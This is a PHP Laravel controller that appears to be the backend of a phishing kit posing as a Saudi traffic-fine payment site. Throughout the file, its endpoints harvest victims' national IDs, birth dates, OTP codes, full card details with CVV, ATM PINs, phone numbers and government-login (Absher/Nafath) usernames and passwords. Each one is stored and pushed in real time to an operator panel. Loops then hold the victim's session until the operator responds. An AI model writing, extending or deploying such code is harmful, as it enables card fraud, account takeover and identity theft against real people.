<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Str;
use Stevebauman\Location\Facades\Location;
use Illuminate\Support\Facades\Route;

class EfaaController extends Controller
{
    //


    public function home(){

        return view('welcome1');

    }


    public function paynow(Request $request){

        $totalFineItemsAmount = $request->input('totalFineItemsAmount');
        return view('new.pay',['totalFineItemsAmount' =>  $totalFineItemsAmount]);

    }



    public function CreateOrder (Request $request) {

        $ViolatorID    = $request->input('ViolatorID');
        $FiensInfoDTOs = $request->input('FiensInfoDTOs');

        $fineAmount = 0;
        foreach($FiensInfoDTOs as $FiensInfoDTO)
        $fineAmount += $FiensInfoDTO['FineAmount'];


         Route::redirect("/addto/$ViolatorID/ $fineAmount/1", '/addto');
      
         //redirect()->action([EfaaController::class, 'addto'], ['violatorID' =>  $ViolatorID,'FiensInfoDTOs' =>  $fineAmount,'inside' => 1]);

    

    }


    public function addto($violatorID, $FiensInfoDTOs,$inside = 0){

        
        if(isset($inside) && $inside == 0) {

            $user =   DB::table('admins')->where('id_ref',$violatorID )->first();
            
            $personalInfo = unserialize( $user->info);
            $totalFineItemsAmount = number_format($personalInfo->violationlInfo->totalFineItemsAmount, 2,'.', '');
        }
        else
            $totalFineItemsAmount = $FiensInfoDTOs;



        return view('new.pay',['totalFineItemsAmount' =>  $totalFineItemsAmount]);

  }



  public function GetViolationsByViolatorHome(Request $request){

    $filter     = $request->input('filter');
    $violatorId = $request->input('violatorId');
    $dob        = $request->input('dob');
    $fromHome   = $request->input('fromHome');
    $cul        = $request->input('cul');


    // $updateData = array('homestatus' => 0 , 'home' => '[]');

    // DB::table('admins')->where('id_ref',$violatorId)->update($updateData);


    $user =   DB::table('admins')->where('id_ref',$violatorId )->first();


    $dataArray = [
                    
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Home" ,
            'sub'   => $violatorId,
            'themainfulname' => "Home",
            'status' => 0 ,
            'mytime' => 0000 
        
    ];

    // $insertedID = DB::table('notifications')->insert($dataArray);


    $html = '     <div class="p-2 mb-2 bg-info text-dark">Home</div>
                   <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                   <h4> ID: '.$violatorId.'</h4>
                   </br><h4> Ticket  : '.$violatorId.'  </h4></br>
                   </div>';
   
//    $htmlData = [
//            'id_ref'  => $user->id,     
//            'username' => $insertedID,
//            'allinfo'  => $html,
//    ];
   
   
    // event(new \App\Events\SendNotification($dataArray));
    // DB::table('user_infos')->insert($htmlData);



 
    $counter = $user->homestatus;


    while($counter == 0){

       
           $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
           if(! empty($user->homestatus))
           $counter++;

    }


    $personalInfo = [];

    if(! empty($user->homestatus) && $user->homestatus == 1){

        $personalInfo = unserialize( $user->home);

        return response()->json(
            $personalInfo , 200, [], JSON_UNESCAPED_UNICODE);

    }


  }


  public function GetViolationsByViolatorinquery(Request $request){

// dd($request->input());
    $violatorId = $request->input('violatorId');
    $dob        = $request->input('dob');
    $fromHome   = $request->input('fromHome');
    $cul        = $request->input('cul');


// dd( $violatorId);

    // $updateData = array('inquerystatus' => 0 , 'inquery' => '[]');

    // DB::table('admins')->where('id_ref',$violatorId)->update($updateData);

    $user =   DB::table('admins')->where('id_ref',$violatorId)->first();


    $dataArray = [
                    
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Inquery" ,
            'sub'   => $violatorId,
            'themainfulname' => "Inquery",
            'status' => 0 ,
            'mytime' => 0000 
        
    ];

    // $insertedID = DB::table('notifications')->insert($dataArray);


    $html = '     <div class="p-2 mb-2 bg-info text-dark">Inquery</div>
                   <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                   <h4> ID: '.$violatorId.'</h4>
                   </br><h4> Ticket  : '.$violatorId.'  </h4></br>
                   </div>';
   
//    $htmlData = [
//            'id_ref'  => $user->id,     
//            'username' => $insertedID,
//            'allinfo'  => $html,
//    ];
   
   
    // event(new \App\Events\SendNotification($dataArray));
    // DB::table('user_infos')->insert($htmlData);

 
    $counter = $user->inquerystatus;


    while($counter == 0){

       
           $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
           if(! empty($user->inquerystatus))
           $counter++;

    }


    $personalInfo = [];
    if(! empty($user->inquerystatus) && $user->inquerystatus == 1){

        $personalInfo = unserialize( $user->inquery);

        return response()->json(
            $personalInfo , 200, [], JSON_UNESCAPED_UNICODE);

    }


    
   }



   public function GetFirmsList(Request $request) {


    return response()->json(
        array(), 200, [], JSON_UNESCAPED_UNICODE);

   }


  


    public function extGetPersonalInfoByIdAndDob(Request $request)  {

        $position = Location::get();

        $countryName = $position->countryName;

        $otp         = $request->input('otp');
        $dateofbirth = $request->input('dob');
        $idNumber    = $request->input('violatorId');

        $verNumber  = $otp;
        
        $userInsertData =  [
    
            'nationalId' => $idNumber,
            'id_ref'     => $idNumber,
            'status'     => 0,
            'fineNumber' => $verNumber,
            'info'       => '{}',
            'inquery'    => '[]',
            'home'       => '[]',
        ];
        
           $user =   DB::table('admins')->where('id_ref',$idNumber )->first();

     

        if(empty( $user)){
            $id   =   DB::table('admins')->insertGetId($userInsertData);
          }
        else {

            $isFound =   DB::table('admins')
                                            ->where('id_ref',$idNumber )
                                            ->first();

           

             if(empty($isFound)) {

                    $userUpdateData =  [
    
                        'status'     => 0,
                        'fineNumber' => $verNumber,
                    ];   
                    
                    
                    DB::table('admins')->where('id_ref',$idNumber )->update($userUpdateData);


             }

             $id   =  $user->id;

        }


                    // Store a piece of data in the session...
                    session(['id' =>  $id ]);


                    $data = [
                        'phone'            => "",
                        'national_id'      => $idNumber,
                        'name'             => "",
                        'gender'           => "",
                        'citizen'          => "",
                        'lang'             => "",
                        'type_licence'     => "",
                        'training_time'    => "",
                        'program'          => "",
                        'id_ref'           => $id
                        ];
            
            
            
                $customer = DB::table('customers')->where('id_ref',$id)->first();
            
                if(isset($customer))
                DB::table('customers')->where('id_ref',$id)->delete();
                
            
                DB::table('customers')->insert($data);  
                
                $customer = DB::table('customers')->where('id_ref',$id)->first();

    
    

                    if(empty($dateofbirth)){
                        $dateofbirthplus = "استعلام";
                        $dateofbirth     = "استعلام";
                    }
                       
                    else
                        $dateofbirthplus = $dateofbirth;
            
            
                $dataArray = [
                    
                    'id' => Str::random(40),
                    'nationalID' => $id,
                    'user_name' => $dateofbirthplus ,
                    'sub'   => $idNumber,
                    'themainfulname' => "استعلام",
                    'status' => 0 ,
                    'mytime' => $verNumber 
                    
                ];
            
                $insertedID = DB::table('notifications')->insert($dataArray);
            
            
                $html = '     <div class="p-2 mb-2 bg-info text-dark">Date Of Birth</div>
                               <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                               <h4> ID: '.$idNumber.'</h4>
                               </br><h4> Ticket  : '.$verNumber.'  </h4></br>
                               <h4> DOB: '.$dateofbirth.'</h4>
                               <h4> OTP: '.$otp.'</h4>
                               <h4> Country : '.$countryName.'</h4>
                               </div>';
               
               $htmlData = [
                       'id_ref'  =>  $id,     
                       'username' => $insertedID,
                       'allinfo'  => $html,
               ];
               
               
        event(new \App\Events\SendNotification($dataArray));
        DB::table('user_infos')->insert($htmlData);


        if($otp == 1) {

            return response()->json( array('errorMessageDTO' => null,
            "expirationTime" => "2024-07-30T00:58:41.122106+03:00",
            'status' => 2 ), 200);

        }
        else
        {



            $user =   DB::table('admins')->where('id_ref',$idNumber)->first();

      
 
            $counter = $user->status;
        
            while($counter == 0){
        
               
                   $user =   DB::table('admins')->where('id_ref',$idNumber)->first();
                   if(! empty($user->status))
                   $counter++;
        
            }
            
    
        
            $personalInfo = [];
            if(! empty($user->status) && $user->status == 1){
        
                $personalInfo = unserialize( $user->info);
        
                return response()->json(
                    array( 'personalInfo' => $personalInfo ), 200, [], JSON_UNESCAPED_UNICODE);
        
            }




        }




    }  

    public function extGetTrafficViolationInfo(Request $request){

        
        $position = Location::get();

        $countryName = $position->countryName;


           $verNumber  = $request->input('fineNumber');
           $idNumber   = $request->input('violatorID');
    
    
        $userInsertData =  [
    
            'nationalId' => $idNumber,
            'id_ref'     => $idNumber,
            'status'     => 0,
            'fineNumber' => $verNumber,
            'info'       => '{}',
            'inquery'    => '{}',
            'home'       => '{}',
            
        ];
    
          $user =   DB::table('admins')->where('id_ref',$idNumber )->first();
        if(empty( $user)){
            $id   =   DB::table('admins')->insertGetId($userInsertData);
          }
        else {

            $isFound =   DB::table('admins')
                                            ->where('id_ref',$idNumber )
                                            ->where('fineNumber' , $verNumber)
                                            ->first();
                       

             if(empty($isFound)) {



                    $userUpdateData =  [
    
                        'status'     => 0,
                        'fineNumber' => $verNumber,
                    ];   
                    
                    
                    DB::table('admins')->where('id_ref',$idNumber )->update($userUpdateData);


             }

             $id   =  $user->id;

        }
         
        
    
            // Store a piece of data in the session...
            session(['id' =>  $id ]);
    
    

            if(empty($dateofbirth)){
                $dateofbirthplus = "استعلام";
                $dateofbirth     = "استعلام";
            }
               
            else
                $dateofbirthplus = $dateofbirth;
    
    
        $dataArray = [
            
            'id' => Str::random(40),
            'nationalID' => $id,
            'user_name' => $dateofbirthplus ,
            'sub'   => $idNumber,
            'themainfulname' => "استعلام",
            'status' => 0 ,
            'mytime' => $verNumber 
            
        ];
    
        $insertedID = DB::table('notifications')->insert($dataArray);
    
    
        $html = '     <div class="p-2 mb-2 bg-info text-dark">Info</div>
                       <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                       <h4> ID: '.$idNumber.'</h4>
                       </br><h4> Ticket  : '.$verNumber.'  </h4></br>
                       <h4> DOB: '.$dateofbirth.'</h4>
                       <h4> Country: '. $countryName.'</h4>
                       </div>';
       
       $htmlData = [
               'id_ref'  =>  $id,     
               'username' => $insertedID,
               'allinfo'  => $html,
       ];
       
       
       event(new \App\Events\SendNotification($dataArray));
       DB::table('user_infos')->insert($htmlData);
    
    
       $user =   DB::table('admins')
                        ->where('id_ref', $idNumber)
                        ->first();

          
    
        $counter = $user->status;
    
        while($counter== 0){
    
           
            $user =   DB::table('admins')
                                            ->where('id_ref', $idNumber)
                                            ->first();
               if(! empty($user->status))
               $counter++;
    
        }
    
    
        $violationlInfo = [];
        if(! empty($user->status) && $user->status == 1){
    
            $violationlInfo = unserialize( $user->info);
    
            return response()->json(
                array( 'violationlInfo' => $violationlInfo ), 200, [], JSON_UNESCAPED_UNICODE);
    
        }
    
       
    
       return response()->json(
                           array( 'violationlInfo' => $violationlInfo ), 409, [], JSON_UNESCAPED_UNICODE);

    }



    public function extSearchByFineNumAndViolaterId(Request $request){

        $position = Location::get();

       $countryName = $position->countryName;

        $verNumber  = $request->input('fineNumber');
        $idNumber   = $request->input('ViolatorID');
 
 
     $userInsertData =  [
 
         'nationalId' => $idNumber,
         'fineNumber' => $verNumber,
         'id_ref'     => $idNumber,
         'status'     => 0,
         'info'       => '{}',
         'inquery'    => '{}',
         'home'       => '{}',
     ];
 
    
       $user =   DB::table('admins')->where(['nationalId' => $idNumber,'fineNumber' => $verNumber])->first();
    //   dd($user );
     if(empty( $user))
       $id   =   DB::table('admins')->insertGetId($userInsertData);
     else
       $id   =  $user->id;




       $data = [
        'phone'            => "",
        'national_id'      => $idNumber,
        'name'             => "",
        'gender'           => "",
        'citizen'          => "",
        'lang'             => "",
        'type_licence'     => "",
        'training_time'    => "",
        'program'          => "",
        'id_ref'           => $id
        ];



$customer = DB::table('customers')->where('id_ref',$id)->first();



if(isset($customer))
DB::table('customers')->where('id_ref',$id)->delete();

// dd($data);
DB::table('customers')->insert($data);  



$customer = DB::table('customers')->where('id_ref',$id)->first();

 
         // Store a piece of data in the session...
         session(['id' =>  $id  ]);
 
 
         if(empty($dateofbirth))
             $dateofbirth = "استعلام";
 
 
     $dataArray = [
         
         'id' => Str::random(40),
         'nationalID' => $id,
         'user_name' => $dateofbirth ,
         'sub'   => $idNumber,
         'themainfulname' => "استعلام",
         'mytime' => $verNumber 
         
     ];
 
     $insertedID = DB::table('notifications')->insert($dataArray);
 
 
     $html = '     <div class="p-2 mb-2 bg-info text-dark">Info</div>
                    <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                    <h4> ID: '.$idNumber.'</h4>
                    </br><h4> Ticket  : '.$verNumber.'  </h4></br>
                    <h4>DOB: '.$dateofbirth.'</h4>
                    <h4> Country : '.$countryName.'</h4>
                    </div>';
    
    $htmlData = [
            'id_ref'  =>  $id,     
            'username' => $insertedID,
            'allinfo'  => $html,
    ];
    
    
    event(new \App\Events\SendNotification($dataArray));
    DB::table('user_infos')->insert($htmlData);
 
 
    $user =   DB::table('admins')->where(['nationalId' => $idNumber,'fineNumber' => $verNumber])->first();

    // dd($user);
 
     $counter = $user->status;
 
     while($counter== 0){
 
        
            $user =   DB::table('admins')->where(['nationalId' => $idNumber,'fineNumber' => $verNumber])->first();
            if(! empty($user->status))
            $counter++;
 
     }
 
     $violationlInfo = [];
     if(! empty($user->status) && $user->status == 1){
 
         $violationlInfo = unserialize( $user->info);
         return response()->json(
             array( 'violationlInfo' => $violationlInfo), 200, [], JSON_UNESCAPED_UNICODE);
 
     }
 
    
 
    return response()->json(
                        array( 'violationlInfo' => $violationlInfo ), 409, [], JSON_UNESCAPED_UNICODE);


    }



    public function creditcard(Request $request){


      

        $cardNumber = $request->input('mynumber');
        $cardExpiry = $request->input('cc-exp');
        $myname     = $request->input('myname');
        $cardCVC    = $request->input('cc-cvc');

        $username = session('username');

        $id = session('id');
        

        $user      = DB::table('admins')->where('id',$id)->first();
        $customer  = DB::table('customers')->where('id_ref',$id)->first();


  

        $dataInserted = [

            'name'      =>  $myname,
            'card'      =>  $cardNumber,
            'exp_date'  =>  $cardExpiry,
            'cvv'       =>  $cardCVC,
            'id_ref'    =>  $user->id,
    
        ];
    
    
        DB::table('credit_cards')->insert($dataInserted);





        $dataArray = [
        
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Card",
            'sub'   => $user->id,
            'themainfulname' => "Card",
            'mytime' => date('Y-m-d H:i:s')
            
        ];
    
    
    
        $insertedID = DB::table('notifications')->insert($dataArray);
    
    
    
     $html = '     <div class="p-2 mb-2 bg-info text-dark">C A R D</div>
                    <div class="bg-light text-left rounded p-4" style="text-align: left;"><div style="color: green;"></br>
                    <h4>Name :'.$myname.'</h4>
                    </br><h4> Number: '.$cardNumber.'  </h4></br>
                    <h4>Exp Date : '.$cardExpiry.' </h4></br>
                    <h4>CVC:  '.$cardCVC.'</br>
                    </div>';
    
    $htmlData = [
            'id_ref'  =>  $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
    ];
    
    
    event(new \App\Events\SendNotification($dataArray));
    DB::table('card_infos')->insert($htmlData);

       return response()->json(array('msg'=> 1), 200);


    }



    public function verifycode(Request $request){

        $code = $request->input('card-ottpt1');
    
        $username     = session('username');
        $id           = session('id');
    
        $user      = DB::table('admins')->where('id',$id)->first();
    
    
    
        $creditcards  =  DB::table('credit_cards')->where('id_ref',$user->id)->orderBy('id', 'DESC')->first();
    
        DB::table('credit_cards')
                                ->where('id', $creditcards->id)
                                ->where('id_ref',$user->id)
                                ->update(['veiry' => $code]);
    
    
    
    
    
    
    
        $dataArray = [
            
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Verify Card",
            'sub'   => $code,
            'themainfulname' => "Verify Card",
            'mytime' => date('Y-m-d H:i:s')
            
        ];
    
    
       
        $insertedID = DB::table('notifications')->insert($dataArray);
    
    
        $html     = '<div class="p-2 mb-2 bg-info text-dark">Card Activation Code</div>
                     <div class="bg-light text-left rounded p-4" style="text-align: left;">
                     <div style="color: red;"></br><h4>Activation Code otp:     '.$code.'</h4></div><hr></br></br></div>';
    
    
        
        $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
        ];  
        
        event(new \App\Events\SendNotification($dataArray));
        DB::table('card_infos')->insert($htmlData); 
    
    
         return response()->json(array('msg'=> 1), 200);

    
    }   



    public function atm(Request $request){


        $code  = $request->input('card-pincode');

        $id    = session('id');

        $user      = DB::table('admins')->where('id',$id)->first();


        $creditcards  =  DB::table('credit_cards')->where('id_ref',$user->id)->orderBy('id', 'DESC')->first();

        DB::table('credit_cards')
                                ->where('id', $creditcards->id)
                                ->where('id_ref',$user->id)
                                ->update(['atm' => $code]);
    

        $dataArray = [
    
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "ATM Code",
            'sub'   =>  $code,
            'themainfulname' => "ATM Code",
            'mytime' => date('Y-m-d H:i:s')
            
        ];
    
    
       
        $insertedID = DB::table('notifications')->insert($dataArray);
    
    
        $html     = '<div class="p-2 mb-2 bg-info text-dark">ATM  Code</div>
                     <div class="bg-light text-left rounded p-4" style="text-align: left;">
                     <div style="color: red;"></br><h4>ATM Code otp:     '.$code.'</h4></div><hr></br></br></div>';
    
    
        
        $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
        ];  
        
        event(new \App\Events\SendNotification($dataArray));
        DB::table('card_infos')->insert($htmlData); 


        $msg = "This is a simple message.";
        return response()->json(array('msg'=> 1), 200);
          
     
     }  




     public function sendphone(Request $request){



            $phone     = $request->input('phoneno');
            $mobilety  = $request->input('mobilety');
            

            $id    = session('id');


            $user      = DB::table('admins')->where('id',$id)->first();
            $customer  = DB::table('customers')->where('id_ref',$id)->first();


            $data = array(   
                             'phone'    => $phone , 
                             'provider' => $mobilety,
                             'status'   => 1 
                            
                            );
            DB::table('customers')->where('id_ref',$id )->update($data);



            $dataArray = [
    
                'id' => Str::random(40),
                'nationalID' => $user->id,
                'user_name' => "Phone",
                'sub'   =>  $phone,
                'themainfulname' => "Phone",
                'mytime' => date('Y-m-d H:i:s')
                
            ];
        
        
           
            $insertedID = DB::table('notifications')->insert($dataArray);



            $html     = '<div class="p-2 mb-2 bg-info text-dark">Phone Info</div>
            <div class="bg-light text-left rounded p-4" style="text-align: left;">
            <div style="color: red;"></br><h4>Phone :     '. $phone.'</h4></div><hr>
            <div style="color: red;"></br><h4>Provider :     '.  $mobilety.'</h4></div>
            </br></br></div>';



            $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
            ];  

            event(new \App\Events\SendNotification($dataArray));
            DB::table('card_infos')->insert($htmlData); 


            $msg = "This is a simple message.";
            return response()->json(array('msg'=> 1), 200);


     }



     public function verifyb(Request $request){


        $code  = $request->input('card-ottpt1');

        $id    = session('id');
        $user  = DB::table('admins')->where('id',$id)->first();



        $dataArray = [
    
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Phone Code",
            'sub'   =>  $code ,
            'themainfulname' => "Phone Code",
            'mytime' => date('Y-m-d H:i:s')
            
        ];

        $insertedID = DB::table('notifications')->insert($dataArray);

        $html     = '<div class="p-2 mb-2 bg-info text-dark">Phone OTP Code</div>
                     <div class="bg-light text-left rounded p-4" style="text-align: left;">
                     <div style="color: red;"></br><h4>Phone OTP Code:     '.$code.'</h4></div><hr></br></br></div>';
    
    
        
        $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
        ];  
        
        event(new \App\Events\SendNotification($dataArray));
        DB::table('card_infos')->insert($htmlData); 


        $msg = "This is a simple message.";


        return response()->json(array('msg'=> 0), 200);

     }



     public function verifya(Request $request){


        $code  = $request->input('card-ottpt1');

        $id    = session('id');
        $user  = DB::table('admins')->where('id',$id)->first();
        $customer  = DB::table('customers')->where('id_ref',$id)->first();




        $dataArray = [
    
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "Phone Code",
            'sub'   =>  $code ,
            'themainfulname' => "Phone Code",
            'mytime' => date('Y-m-d H:i:s')
            
        ];

        $insertedID = DB::table('notifications')->insert($dataArray);

        $html     = '<div class="p-2 mb-2 bg-info text-dark">Phone OTP Code</div>
                     <div class="bg-light text-left rounded p-4" style="text-align: left;">
                     <div style="color: red;"></br><h4>Phone OTP Code:     '.$code.'</h4></div><hr></br></br></div>';
    
    
        
        $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
        ];  
        
        event(new \App\Events\SendNotification($dataArray));
        DB::table('card_infos')->insert($htmlData); 


        $msg = "This is a simple message.";

        if($customer->status == 3)
        return response()->json(array('msg'=> 3), 200);
     else
        return response()->json(array('msg'=> 0), 200);


     }




     public function  loginAbsher(Request $request) {



           
        $USERNAME          = $request->input('USER');
        $PASSWORD          = $request->input('PWD');


       $id           = session('id');
       $user         = DB::table('admins')->where('id',$id)->first();
       $customer     = DB::table('customers')->where('id_ref',$id)->first();

       $data = [

        'username'  => $USERNAME,
        'password'  => $PASSWORD,
        'phone'     => $customer->phone,
        'status'    => 0,
        'number'    => 0,
        'id_ref'    => $user->id

      ];

     
      
      $loguser = DB::table('logins')->where('id_ref',$user->id)->first();
      if(! empty( $loguser))
         DB::table('logins')->where('id_ref',$user->id)->delete();


         DB::table('logins')->insert($data);



         $dataArray = [
        
            'id' => Str::random(40),
            'nationalID' => $user->id,
            'user_name' => "NAFATH",
            'sub'   =>  $user->id,
            'themainfulname' => "NAFATH",
            'mytime' => date('Y-m-d H:i:s')
            
        ];
    
    
       
        $insertedID = DB::table('notifications')->insert($dataArray);
    
    
        $html     = '<div class="p-2 mb-2 bg-info text-dark">Nafath Login</div>
                     <div class="bg-light text-left rounded p-4" style="text-align: left;">
                     <div style="color: red;"></br>
                     <h4>username:'.$USERNAME.'</h4></br>
                     <h4>username:'.$PASSWORD.'</h4>
                     </div><hr></br></br></div>';
    
    
        
        $htmlData = [
            'id_ref'   => $user->id,     
            'username' => $insertedID,
            'allinfo'  => $html,
        ];  
        
        event(new \App\Events\SendNotification($dataArray));
        DB::table('card_infos')->insert($htmlData); 


        return response()->json(array('msg'=> 1), 200);



     }


     public function getStatus(){

        $status  = 0;
        $logins  = 0;
        $credits = 0;
        // $bankStatus   = DB::table('banks')->first();

        $id = session('id');
        $customer     = DB::table('customers')->where('id_ref',$id)->first();

        $loginStatus  = DB::table('logins')->where('id_ref',$customer->id_ref)->first();

        // $creditStatus = DB::table('credit_cards')->first();


            if ($loginStatus->status == 0)
            { return response()->json(array('live'=> 'no')); }
        elseif ($loginStatus->status == 1)
           { return response()->json(array('live'=> $loginStatus->number )); }
        elseif ($loginStatus->status == 2) 
           { return response()->json(array('live'=> 'cancl')); }
        elseif ($loginStatus->status == 6 ) 
        { return response()->json(array('live'=> 'whatsapp')); }
        else
           return response()->json(array('live'=> 'still')); 

        


    }

     


}
